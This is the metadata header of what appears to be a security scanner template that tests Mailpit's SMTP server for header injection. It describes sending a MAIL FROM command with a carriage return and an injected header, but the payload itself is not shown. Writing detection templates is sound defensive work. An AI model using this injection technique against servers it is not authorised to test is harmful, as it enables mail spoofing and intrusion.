info:
  name: Mailpit SMTP - Header Injection via Regex Bypass (Injector)
  author: omarkurt
  severity: medium
  description: |
    This template injects a custom header into an SMTP transaction to test for header injection vulnerabilities in Mailpit. By sending a specially crafted MAIL FROM command with a carriage return and additional header, we can determine if the server is vulnerable to header injection. This is a non-destructive test that does not rely on any specific response content, making it suitable for safely identifying the vulnerability.
